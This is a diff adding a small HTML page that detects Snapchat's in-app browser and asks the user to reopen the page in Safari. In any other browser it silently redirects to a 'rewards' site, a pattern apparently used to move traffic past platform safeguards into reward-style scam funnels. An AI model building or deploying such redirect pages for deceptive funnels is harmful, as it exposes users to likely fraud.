@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Continue in Safari</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body { font-family: Arial, sans-serif; padding: 20px; text-align: center; }
+    .hidden { display: none; }
+    .btn {
+      margin-top: 20px;
+      padding: 14px 24px;
+      background-color: #007bff;
+      color: white;
+      border: none;
+      font-size: 18px;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+  </style>
+</head>
+<body>
+
+  <div id="snapchat-warning" class="hidden">
+    <h2>To continue</h2>
+    <p>Please click the button below to open this page in Safari.</p>
+    <button class="btn" onclick='window.open("https://rewardsplace.net/sh-snap", "_blank")'>
+      Open in Safari
+    </button>
+  </div>
+
+  <script>
+    const ua = navigator.userAgent.toLowerCase();
+    const isSnapchat = ua.includes("snapchat");
+
+    if (isSnapchat) {
+      document.getElementById("snapchat-warning").classList.remove("hidden");
+    } else {
+      window.location.href = "https://rewardsplace.net/sh-snap";
+    }
+  </script>
+
+</body>
+</html>
